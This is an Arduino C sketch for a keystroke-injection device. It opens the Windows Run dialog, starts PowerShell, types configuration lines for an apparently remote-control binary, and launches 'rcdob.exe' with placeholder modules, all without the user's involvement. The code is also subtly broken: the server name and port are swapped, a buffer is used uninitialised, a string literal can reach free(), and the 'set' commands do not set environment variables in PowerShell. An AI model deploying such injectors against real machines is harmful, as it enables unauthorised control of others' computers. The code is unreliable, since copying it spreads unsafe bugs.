#include "Keyboard.h"

char binaryCmdline[] = "start rcdob.exe ";
char userAgentConfig[] = "set RCDO_USERAGENT=firefox";
char serverNameConfig[] = "set RCDO_SERVERPORT=localhost";
char serverPortConfig[] = "set RCDO_SERVERNAME=5000";

char* selectModules(uint8_t menuSelected){
  char* modules = (char*)malloc(512);
  if (modules == NULL){
    // handle error
    return "";
  }
  switch(menuSelected){
    case 1:
      strcpy(modules," PLACEHOLDER1");
      break;
    case 2:
      strcpy(modules," PLACEHOLDER2");
      break;
    case 3:
      strcpy(modules," PLACEHOLDER3");
      break;
    case 4:
      strcpy(modules," PLACEHOLDER4");
      break;
    default:
      break;
  }
  return modules;
}


// Keyboard needs to begin before this function is called.
void runPS(){
  Keyboard.write(0);
  delay(30);
  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.print('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("powershell.exe");
  Keyboard.write(KEY_RETURN);
  delay(30);
  delay(500);
}

void setupConfig(){
  Keyboard.print(userAgentConfig);
  Keyboard.write(KEY_RETURN);
  delay(30);

  Keyboard.print(serverNameConfig);
  Keyboard.write(KEY_RETURN);
  delay(30);

  Keyboard.print(serverPortConfig);
  Keyboard.write(KEY_RETURN);
}

void startBinary(int option){
  Keyboard.begin();
  runPS();
  setupConfig();
  char buf[560];
  strcat(buf,binaryCmdline);
  char *mods = selectModules(option);
  strcat(buf,mods);
  
  Keyboard.print(buf);
  Keyboard.write(KEY_RETURN);

  delay(500);
  Keyboard.print("end");
  Keyboard.write(KEY_RETURN);

  delay(500);
  Keyboard.print("end");
  Keyboard.write(KEY_RETURN);
  delay(30);
  
  free(mods);
  Keyboard.end();
}
